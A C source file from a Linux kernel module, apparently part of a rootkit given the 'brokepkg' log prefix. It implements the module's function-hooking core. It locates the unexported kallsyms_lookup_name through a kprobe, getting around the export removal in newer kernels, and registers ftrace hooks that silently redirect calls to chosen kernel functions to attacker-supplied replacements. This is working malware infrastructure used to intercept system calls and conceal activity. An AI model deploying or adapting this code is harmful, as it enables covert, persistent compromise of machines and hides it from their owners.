#include "my_ftrace.h"

int fh_resolve_hook_address(struct ftrace_hook *hook) {
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 7, 0)
	static struct kprobe kp = {.symbol_name = "kallsyms_lookup_name"};
	typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
	kallsyms_lookup_name_t kallsyms_lookup_name;
	register_kprobe(&kp);
	kallsyms_lookup_name = (kallsyms_lookup_name_t)kp.addr;
	unregister_kprobe(&kp);
#endif
	hook->address = kallsyms_lookup_name(hook->name);

	if (!hook->address) {
		pr_debug("brokepkg: unresolved symbol: %s\n", hook->name);
		return -ENOENT;
	}

	*((unsigned long *)hook->original) = hook->address;

	return 0;
}

void notrace fh_ftrace_thunk(unsigned long ip, unsigned long parent_ip,
                             struct ftrace_ops *ops,
                             struct ftrace_regs *fregs) {
	struct pt_regs *regs = ftrace_get_regs(fregs);
	struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);

	if (!within_module(parent_ip, THIS_MODULE))
		regs->ip = (unsigned long)hook->function;
}

int fh_install_hook(struct ftrace_hook *hook) {
	int err;
	err = fh_resolve_hook_address(hook);
	if (err) return err;

	hook->ops.func = fh_ftrace_thunk;
	hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_RECURSION |
						FTRACE_OPS_FL_IPMODIFY | FTRACE_OPS_FL_RCU;

	err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
	if (err) {
		pr_err("brokepkg: ftrace_set_filter_ip() failed: %d\n", err);
		return err;
	}

	err = register_ftrace_function(&hook->ops);
	if (err) {
		pr_err("brokepkg: register_ftrace_function() failed: %d\n", err);
		return err;
	}

	return 0;
}

void fh_remove_hook(struct ftrace_hook *hook) {
	int err;
	err = unregister_ftrace_function(&hook->ops);
	if (err) {
		pr_err("brokepkg: unregister_ftrace_function() failed: %d\n", err);
	}

	err = ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
	if (err) {
		pr_err("brokepkg: ftrace_set_filter_ip() failed: %d\n", err);
	}
}

MODULE_LICENSE("GPL");